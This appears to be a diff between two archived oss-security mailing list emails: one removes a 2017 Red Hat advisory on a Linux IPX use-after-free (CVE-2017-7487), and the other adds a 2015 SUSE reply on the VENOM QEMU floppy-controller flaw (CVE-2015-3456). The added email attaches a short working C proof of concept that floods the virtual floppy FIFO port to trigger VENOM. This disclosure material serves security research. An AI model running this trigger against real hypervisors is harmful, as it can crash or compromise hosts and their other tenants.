@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["601" "Friday" "12" "May" "2017" "09:24:56" "-0400" "Vladis Dronov" "vdronov@redhat.com" "<138470974.7338270.1494595496637.JavaMail.zimbra@redhat.com>" "21" "[oss-security] CVE-2017-7487: Linux kernel: ipx: call ipxitf_put() in ioctl error path" nil nil nil "5" "2017051213:24:56" "[oss-security] CVE-2017-7487: Linux kernel: ipx: call ipxitf_put() in ioctl error path" (number mark "U       vdronov@redh May 12   21/601   " thread-indent "\"[oss-security] CVE-2017-7487: Linux kernel: ipx: call ipxitf_put() in ioctl error path\"\n") "<1731133438.6882472.1494519713367.JavaMail.zimbra@redhat.com>" ("<1731133438.6882472.1494519713367.JavaMail.zimbra@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1334" "Wednesday" "13" "May" "2015" "23:20:40" "+0200" "Marcus Meissner" "meissner@suse.de" "<20150513212040.GA22701@suse.de>" "40" "Re: [oss-security] VENOM - CVE-2015-3456" nil nil nil "5" "2015051321:20:40" "[oss-security] VENOM - CVE-2015-3456" (number mark "        meissner@sus May 13   40/1334  " thread-indent "\"Re: [oss-security] VENOM - CVE-2015-3456\"\n") "<20150513205720.GA20756@openwall.com>" ("<ba24ac6088a34b9d97fd721591f1e922@casmbox01.crowdstrike.sys>" "<20150513205720.GA20756@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 30709 invoked by uid 550); 12 May 2017 13:25:09 -0000
+Received: (qmail 5979 invoked by uid 550); 13 May 2015 21:20:53 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,47 +11,62 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 30691 invoked from network); 12 May 2017 13:25:09 -0000
-DMARC-Filter: OpenDMARC Filter v1.3.2 mx1.redhat.com 250AD804E0
-Authentication-Results: ext-mx03.extmail.prod.ext.phx2.redhat.com; dmarc=none (p=none dis=none) header.from=redhat.com
-Authentication-Results: ext-mx03.extmail.prod.ext.phx2.redhat.com; spf=pass smtp.mailfrom=vdronov@redhat.com
-DKIM-Filter: OpenDKIM Filter v2.11.0 mx1.redhat.com 250AD804E0
-Date: Fri, 12 May 2017 09:24:56 -0400 (EDT)
-From: Vladis Dronov <vdronov@redhat.com>
-To: oss-security@lists.openwall.com
-Message-ID: <138470974.7338270.1494595496637.JavaMail.zimbra@redhat.com>
-In-Reply-To: <1731133438.6882472.1494519713367.JavaMail.zimbra@redhat.com>
-References: <1731133438.6882472.1494519713367.JavaMail.zimbra@redhat.com>
+Received: (qmail 5960 invoked from network); 13 May 2015 21:20:52 -0000
+X-Virus-Scanned: by amavisd-new at test-mx.suse.de
+Message-ID: <20150513212040.GA22701@suse.de>
+References: <ba24ac6088a34b9d97fd721591f1e922@casmbox01.crowdstrike.sys>
+ <20150513205720.GA20756@openwall.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
-X-Originating-IP: [10.40.1.12, 10.4.195.2]
-Thread-Topic: CVE-2017-7472 Linux kernel: KEYS: fix keyctl_set_reqkey_keyring() to not leak thread keyrings
-Thread-Index: 0cmp5i6vtxZ/c2BCxksViljVZTngJyPN3Gy0
-X-Scanned-By: MIMEDefang 2.79 on 10.5.11.16
-X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.27]); Fri, 12 May 2017 13:24:57 +0000 (UTC)
-Subject: [oss-security] CVE-2017-7487: Linux kernel: ipx: call ipxitf_put() in ioctl error
- path
+Content-Type: multipart/mixed; boundary="YiEDa0DAkWCtVeE4"
+Content-Disposition: inline
+In-Reply-To: <20150513205720.GA20756@openwall.com>
+Organization: SUSE Linux GmbH, GF: =?iso-8859-1?Q?Felix_?=
+ =?iso-8859-1?Q?Imend=F6rffer=2C_Jane_Smithard=2C_Dilip_Upmanyu=2C_Graham_?=
+ =?iso-8859-1?Q?Norton=2C_HRB_21284_=28AG_N=FCrnberg=29?=
+User-Agent: Mutt/1.5.21 (2010-09-15)
+Date: Wed, 13 May 2015 23:20:40 +0200
+From: Marcus Meissner <meissner@suse.de>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] VENOM - CVE-2015-3456
+To: oss-security@lists.openwall.com
 
-Hello,
+--YiEDa0DAkWCtVeE4
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-A reference counter leak in Linux kernel in ipxitf_ioctl function was found
-which results into use after free vulnerability that's triggerable from
-unprivileged userspace when IPX interface is configured.
+On Wed, May 13, 2015 at 11:57:20PM +0300, Solar Designer wrote:
+> On Wed, May 13, 2015 at 12:22:19PM +0000, Jason Geffner wrote:
+> > VENOM, CVE-2015-3456, is a security vulnerability in the virtual floppy drive code used by many computer virtualization platforms.
+> 
+> Some bits of contemporary history, off Twitter:
+> 
+> <nelhage> All I have to say about VENOM is that I was exploiting obsolete hardware in qemu years before it was cool.  https://blog.nelhage.com/2011/08/breaking-out-of-kvm/
+> <solardiz> @nelhage I think @taviso was there first, with emulated Cirrus Logic VGA (CVE-2007-1320) and NE2000 vulns in QEMU.  http://taviso.decsystem.org/virtsec.pdf
 
-cvss3=5.6/CVSS:3.0/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:H
-cwe=CWE-416
+Yeah, we fixed a lot of them, some less, some more exploitable.
 
-References:
+As I had some confusion on if the fdc is disabled or not in regards to
+the -nodefaults, so I wrote a small PoC.
 
-https://patchwork.ozlabs.org/patch/757549/
+(and no, -nodefaults does not disable the fdc)
 
-https://bugzilla.redhat.com/show_bug.cgi?id=1447734
+Ciao, Marcus
 
-Upstream patch:
+--YiEDa0DAkWCtVeE4
+Content-Type: text/x-c; charset=us-ascii
+Content-Disposition: attachment; filename="xx.c"
 
-https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ee0d8d8482345ff97a75a7d747efc309f13b0d80
+#include <sys/io.h>
 
-Best regards,
-Vladis Dronov | Red Hat, Inc. | Product Security Engineer
+#define FIFO 0x3f5
+
+int main() {
+        int i;
+        iopl(3);
+
+        outb(0x0a,0x3f5); /* READ ID */
+        for (i=0;i<10000000;i++)
+                outb(0x42,0x3f5); /* push */
+}
+
+--YiEDa0DAkWCtVeE4--
